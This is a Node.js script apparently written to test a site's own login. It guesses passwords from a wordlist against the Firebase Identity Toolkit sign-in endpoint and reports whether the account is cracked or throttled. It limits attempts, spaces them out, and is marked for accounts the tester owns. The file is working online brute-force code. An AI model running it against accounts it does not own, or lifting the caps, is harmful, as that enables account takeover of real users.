#!/usr/bin/env node
/* ─── BRUTE-FORCE ATTACK LAB ───────────────────────────────────────────────
 * Target: the sign-in behind public/login.html.
 *
 * login.html calls signInWithEmailAndPassword() → Firebase Identity Toolkit
 * accounts:signInWithPassword. This script hits that exact endpoint with a
 * wordlist, so it exercises the real authentication path of this site.
 *
 * LIMITED RUN by design: attempts are capped (default 10, hard cap 25) and
 * spaced by a delay (default 1500 ms). It stops immediately on success or on
 * Firebase throttling (auth/too-many-requests). Authorized testing only —
 * run it against accounts you own.
 *
 *   node scripts/security/brute-force.mjs --email you@example.com
 *   node scripts/security/brute-force.mjs --email you@example.com --max 5 --delay 1500
 *   node scripts/security/brute-force.mjs --email you@example.com --emulator   # local Auth emulator
 *
 * Wordlist format: one candidate password per line, lines starting with # skip.
 * ───────────────────────────────────────────────────────────────────────── */
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const here = dirname(fileURLToPath(import.meta.url));
const args = process.argv.slice(2);
const value = (name, fallback) => { const i = args.indexOf(name); return i >= 0 && args[i + 1] && !args[i + 1].startsWith('--') ? args[i + 1] : fallback; };
const flag = name => args.includes(name);

const email = value('--email', '');
const wordlistPath = value('--wordlist', join(here, 'wordlist.txt'));
const MAX = Math.min(Math.max(parseInt(value('--max', '10'), 10) || 10, 1), 25); // hard cap 25
const DELAY = Math.min(Math.max(parseInt(value('--delay', '1500'), 10) || 1500, 500), 10000);
const emulator = flag('--emulator');

if (!email.includes('@')) {
  console.error('Usage: node scripts/security/brute-force.mjs --email <account-you-own> [options]');
  console.error('  --max N        attempt cap (default 10, hard max 25)');
  console.error('  --delay MS     pause between attempts (default 1500, min 500)');
  console.error('  --wordlist F   candidate list (default scripts/security/wordlist.txt)');
  console.error('  --emulator     hit the local Auth emulator instead of production');
  console.error('\nAuthorized testing only: run this against accounts you own.');
  process.exit(1);
}

// The web API key is a public project identifier (see public/js/firebase.js).
const source = readFileSync(join(here, '..', '..', 'public', 'js', 'firebase.js'), 'utf8');
const apiKey = /apiKey:\s*'([^']+)'/.exec(source)?.[1];
if (!apiKey) { console.error('Could not read the Firebase web API key from public/js/firebase.js.'); process.exit(1); }

const endpoint = emulator
  ? `http://127.0.0.1:9099/identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${apiKey}`
  : `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${apiKey}`;

const words = readFileSync(wordlistPath, 'utf8').split(/\r?\n/).map(w => w.trim()).filter(w => w && !w.startsWith('#'));
if (!words.length) { console.error(`Wordlist is empty: ${wordlistPath}`); process.exit(1); }

const sleep = ms => new Promise(r => setTimeout(r, ms));
const isLockout = r => r.status === 429 || /TOO_MANY_ATTEMPTS|RESOURCE_EXHAUSTED/.test(r.code);

async function attempt(password) {
  const started = Date.now();
  try {
    const res = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, returnSecureToken: true }),
    });
    const body = await res.json().catch(() => ({}));
    return {
      ok: !!(res.ok && body.idToken),
      status: res.status,
      code: body?.error?.message || (res.ok ? 'OK' : `HTTP ${res.status}`),
      ms: Date.now() - started,
    };
  } catch (e) {
    return { ok: false, status: 0, code: `NETWORK: ${e.message}`, ms: Date.now() - started, fatal: true };
  }
}

console.log('Brute-force lab — limited run');
console.log(`  target   : ${email}`);
console.log(`  endpoint : ${emulator ? 'Auth emulator' : 'identitytoolkit.googleapis.com'} · accounts:signInWithPassword`);
console.log(`  wordlist : ${wordlistPath} (${words.length} candidates)`);
console.log(`  limits   : max ${MAX} attempts · ${DELAY} ms between tries · stops on success or lockout\n`);

let cracked = null;
let lockout = false;
let used = 0;

for (const candidate of words) {
  if (used >= MAX) break;
  const r = await attempt(candidate);
  used++;
  const mark = r.ok ? 'CRACKED' : isLockout(r) ? 'LOCKED OUT' : 'fail';
  console.log(`  #${String(used).padStart(2)}  ${candidate.padEnd(16)} → ${mark.padEnd(10)} ${r.code}  (${r.ms} ms)`);
  if (r.ok) { cracked = candidate; break; }
  if (isLockout(r)) { lockout = true; break; }
  if (r.fatal) { console.log(`\nStopped: ${r.code}`); break; }
  if (used < MAX) await sleep(DELAY);
}

console.log('\n── Result ─────────────────────────────────────────────────');
if (cracked) {
  console.log(`VULNERABLE — password recovered after ${used} attempt(s): "${cracked}"`);
  console.log('Any page guarded by this login is only as strong as that password.');
} else if (lockout) {
  console.log(`MITIGATED — Firebase throttled the attack after ${used} attempt(s)`);
  console.log('(the login page maps this to "Too many attempts. Wait a few minutes.")');
} else {
  console.log(`NOT CRACKED — candidates exhausted inside the ${MAX}-attempt cap (${used} attempt(s)).`);
  console.log('A larger wordlist would keep going; the cap is what stopped this run.');
}
